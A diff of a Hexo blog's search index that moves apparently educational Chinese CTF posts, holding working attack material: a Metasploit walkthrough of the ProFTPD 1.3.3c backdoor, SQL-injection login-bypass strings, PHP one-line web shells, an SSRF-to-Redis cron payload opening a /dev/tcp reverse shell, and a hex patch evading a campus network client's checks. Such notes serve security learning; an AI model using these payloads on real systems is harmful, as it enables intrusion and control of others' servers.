@@ -1,79 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>FTP服务后门利用</title>
-    <url>/2024/09/11/602e2b077e4b/</url>
-    <content><![CDATA[<h1 id="FTP服务后门利用"><a href="#FTP服务后门利用" class="headerlink" title="FTP服务后门利用"></a>FTP服务后门利用</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1. 信息探测"></a>1. 信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV IP <span class="comment"># 扫描主机服务信息以及服务版本</span></span><br><span class="line">namp -A -v -T4 IP <span class="comment"># 最大线程扫描主机所有信息</span></span><br></pre></td></tr></table></figure></div>
-
-<p>发现FTP服务<code>（端口号为21）</code></p>
-<p>记录FTP软件名以及版本号</p>
-<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h3><h4 id="1-1SearchSploit”漏洞查找工具"><a href="#1-1SearchSploit”漏洞查找工具" class="headerlink" title="1.1SearchSploit”漏洞查找工具"></a>1.1SearchSploit”漏洞查找工具</h4><blockquote>
-<p>“SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以查找渗透模块。Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。它不会包含任何文件和谷歌黑客数据库的结果。终端输入”searchsploit”启动。</p>
-</blockquote>
-<h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
-
-<p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201710758.png"
-                     
-                ></p>
-<p><strong>我们使用第二种方法</strong></p>
-<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711103.png"
-                      alt="2"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711011.png"
-                      alt="3"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712093.png"
-                      alt="4"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712162.png"
-                      alt="5"
-                ></p>
-<p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="3-获取flag"><a href="#3-获取flag" class="headerlink" title="3.获取flag"></a>3.获取flag</h3><p>一般flag在根目录也就是&#x2F;root中</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root  //进入root目录</span><br><span class="line"><span class="built_in">ls</span>  //查看当前目录（文件夹）中文件列表</span><br><span class="line"><span class="built_in">cat</span> flag  //打开flag文件</span><br></pre></td></tr></table></figure></div>
-
-<p>成功获取flag</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>FTP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AI（Python）学习准备——呕心沥血版</title>
     <url>/2024/09/23/c615d06f1ce9/</url>
     <content><![CDATA[<h1 id="学习准备"><a href="#学习准备" class="headerlink" title="学习准备"></a>学习准备</h1><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><p>本文以下是PyCharm+Anaconda+jupyter的保姆级安装方案，为后面的学习做好准备，如果觉得Anaconda安装太过于麻烦，可以选择一个python版本进行安装和配置环境（详情请自行寻找教程）。</p>
@@ -863,9 +790,27 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>common</tag>
+        <tag>CTF</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/09/11/60ab45b83526/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
   </entry>
   <entry>
     <title>sql注入（IP命令行）</title>
@@ -971,44 +916,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2024/09/11/60ab45b83526/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>万能登陆密码</title>
-    <url>/2024/09/11/d77af8045ce5/</url>
-    <content><![CDATA[<h1 id="绕过登陆常用万能密码"><a href="#绕过登陆常用万能密码" class="headerlink" title="绕过登陆常用万能密码"></a>绕过登陆常用万能密码</h1><p>所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。</p>
-<h3 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">2：&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">3：or 1=1--</span><br><span class="line"></span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">7：&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<p>admin’or 1&#x3D;1#</p>
-<h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><p>admin’&#x2F;*<br>密码*&#x2F;‘<br>‘or 1&#x3D;1&#x2F;*</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&quot;or1=1--</span><br><span class="line"></span><br><span class="line">&quot;or=or&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1/*</span><br><span class="line"></span><br><span class="line">&#x27;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27; &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or1=1--</span><br><span class="line"></span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27;1=1--</span><br><span class="line"></span><br><span class="line">or &#x27;a&#x27;=&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">or 1=1--</span><br><span class="line"></span><br><span class="line">or1=1--</span><br></pre></td></tr></table></figure></div>
-
-
-
-]]></content>
-      <categories>
-        <category>common</category>
-      </categories>
-      <tags>
-        <tag>common</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ssh密钥泄露</title>
     <url>/2024/09/11/478a9824d4db/</url>
     <content><![CDATA[<h1 id="ssh密钥泄露"><a href="#ssh密钥泄露" class="headerlink" title="ssh密钥泄露"></a>ssh密钥泄露</h1><p>&#x3D;&#x3D;ssh常用端口为22&#x3D;&#x3D;</p>
@@ -1100,22 +1007,6 @@
       <tags>
         <tag>CTF</tag>
         <tag>ssh</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/2024/09/11/776247657efa/</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -1269,124 +1160,6 @@
       </categories>
       <tags>
         <tag>AI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
-    <url>/2024/09/21/7d3ba1c32839/</url>
-    <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
-<p><strong>注意：此方法只适用于虚拟机网络使用NAT连接。</strong></p>
-<p>首先我们先要知道为什么校园网会自动关闭虚拟机的NAT网络，说白了就是扫你服务是否开启，如果你的NAT服务开启，他就给你关闭。所以我们解决这个问题就要找到他的扫描在哪里。</p>
-<p>首先先按照以下方法来操作，你最后就会知道原理。先卸载你之前的校园网，并且把文件夹里的文件删除干净。</p>
-<p>首先需要做好准备，下载一个可以查看字节的软件，比如010editor、PEview、UltraEdit等。这里我们采用UltraEdit。相关软件请自行搜索下载。</p>
-<p>然后下载校园网认证的<a href="">安装包</a>进行安装。选择安装路径。然后点击立即安装。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211845185.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854110.png"
-                      alt="image-20240921185459092"
-                ></p>
-<h4 id="注意：这里安装完成后不要点击完成安装！！！！"><a href="#注意：这里安装完成后不要点击完成安装！！！！" class="headerlink" title="注意：这里安装完成后不要点击完成安装！！！！"></a>注意：这里安装完成后不要点击完成安装！！！！</h4><p>然后我们打开校园网安装路径的根目录，找到8021x.exe，这个exe文件其实就是扫描你的服务的，当你认证了校园网后，这个服务也会在后台运行，并且这个程序是关不了的，关了你的校园网也没了，所以很ex。。并且当你完成安装后，这个exe文件也就绑定了，无法更改（更改后会自动还原）。但是你没有点完成安装，这个文件就是可修改的。这就是原理。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854775.png"
-                      alt="image-20240921185425761"
-                ></p>
-<p>然后我们打开UltraEdit，把这个文件拖入到UltraEdit。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211856159.png"
-                      alt="image-20240921185659129"
-                ></p>
-<p>然后按住键盘的ctrl+f，进行搜索：<code>VMware NAT Service</code>，然后这里把这个字节改了就行，随便改，这里我把<code>VMware</code>改成了<code>VWware</code>。然后更改完成后按ctrl+s进行保存，这里就完成了，关闭UltraEdit。然后点击完成安装.</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211910081.png"
-                      alt="image-20240921191031242"
-                ></p>
-<p>这里就完成了，登陆校园网后，按住ctrl+shift+esc，打开任务管理器，点开服务，搜索NAT，然后右键启动VMware NAT Service，就会发现，这个服务不会被自动关闭了，虚拟机就可以正常上网了。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211911440.png"
-                      alt="image-20240921191124399"
-                ></p>
-]]></content>
-      <categories>
-        <category>common</category>
-      </categories>
-      <tags>
-        <tag>common</tag>
-        <tag>校园网</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>服务器请求伪造（SSRF）</title>
-    <url>/2024/09/11/fdbfb64754f6/</url>
-    <content><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
-<p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
-<p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
-<ul>
-<li>读取内网文件;</li>
-<li>扫描内网服务和端口;</li>
-<li>收集内网 web 应用的指纹识别，根据这些信息进行下一步的渗透:</li>
-<li>攻击运行在内网的系统或应用程序.</li>
-</ul>
-<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>漏洞点：</strong>能够对外发起网络请求的服务器，就可能存在SSRF漏洞</p>
-<p><strong>web功能</strong></p>
-<p>服务器端请求伪造漏洞是在服务端获取其他服务器的相关信息的功能中形成的，因此我们可以列举几种在web应用中常见的从服务端获取其他服务器信息的的功能:</p>
-<ol>
-<li>分享URL:通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</li>
-<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</li>
-<li>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</li>
-<li>图片加载与下载:通过URL地址加载或下载图片。</li>
-<li>通过api获取远程地址文件来加载内容。</li>
-</ol>
-<p><strong>URL关键字</strong></p>
-<p>寻找需要加载外部资源的URL，可能存在SSRF漏洞。这些URL中经常包含的关键词有<code>share、wap、ur1、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code>等利用 google 语法(inurl:url&#x3D;)加上这些关键字去寻找 SSRF 漏洞，耐心的验证，可以找到存在的 SSRF漏洞。</p>
-<p><strong>判断漏洞是否存在：</strong>在目标网站上攻击者IP，如果攻击的服务器日志能看到目标服务器对自己发起的请求，说明存在漏洞。</p>
-<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1. 读取敏感文件"></a>1. 读取敏感文件</h3><p>**file协议:**本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击打开一样。格式:file:&#x2F;&#x2F;filepath</p>
-<p><strong>重要文件：</strong></p>
-<ol>
-<li>&#x2F;etc&#x2F;passwd:在Linux中，&#x2F;etc&#x2F;passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段:<code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 shell</code></li>
-<li>&#x2F;etc&#x2F;shadow:用于存储 Linux 系统中用户的密码信息，只有 root 用户拥有读权限，其他用户没有任何权限。</li>
-<li>&#x2F;etc&#x2F;hosts:在linux中，主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开!当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。</li>
-</ol>
-<h3 id="2-探测内网服务"><a href="#2-探测内网服务" class="headerlink" title="2. 探测内网服务"></a>2. 探测内网服务</h3><p>**dict协议:**一个字典服务器协议，在ssrf中常用于探测日标服务器端口上运行的服务版本信息。格式:dict:&#x2F;&#x2F;ip:port。先利用file协议读取&#x2F;etc&#x2F;hosts获取ip，通过 dict 协议读取目标服务器端口上运行的服务版本信息</p>
-<p>探测内网存活IP和开放端口:可利用BurpSuite，批量探测存活IP和开放端口。</p>
-<ol>
-<li><p>开启Burpsuite，并访问待测试的网站:<a class="link"   href="http://120.27.61.239:8006/source/index.php" >http://120.27.61.239:8006/source/index.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>;</p>
-</li>
-<li><p>将抓到的包发送到Intruder模块，设置IP或者端口，进行爆破;</p>
-</li>
-</ol>
-<p><strong>探测内网redis：</strong>REmote Dlctionary Server(Redis)是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis一般绑定在本地(不允许远程访问)，默认不开启认证，默认端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。使用dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库</p>
-<p>同样可以利用Burp进行爆破</p>
-<h3 id="3-攻击内网应用"><a href="#3-攻击内网应用" class="headerlink" title="3. 攻击内网应用"></a>3. 攻击内网应用</h3><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis 的用户是root 用户，攻击者可以通过写<strong>定时任务</strong>的方式进行反弹shell。<br>定时任务类似日常生活之中的闹钟，主要用于定时执行某些命令，达到定时处理数据的作用。不同的系统定时任务保存位置不一样，比如:<br>centos(cat &#x2F;etc&#x2F;redhat-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;日录下;<br>ubuntu(cat &#x2F;etc&#x2F;lsb-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下。</p>
-<p><strong>攻击payload:</strong></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
-
-<p>然后攻击机进行监听</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
-
-<p>定时任务执行后就会反弹shell到攻击机</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>SSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -1545,6 +1318,233 @@
       <tags>
         <tag>CTF</tag>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>FTP服务后门利用</title>
+    <url>/2024/09/11/602e2b077e4b/</url>
+    <content><![CDATA[<h1 id="FTP服务后门利用"><a href="#FTP服务后门利用" class="headerlink" title="FTP服务后门利用"></a>FTP服务后门利用</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1. 信息探测"></a>1. 信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV IP <span class="comment"># 扫描主机服务信息以及服务版本</span></span><br><span class="line">namp -A -v -T4 IP <span class="comment"># 最大线程扫描主机所有信息</span></span><br></pre></td></tr></table></figure></div>
+
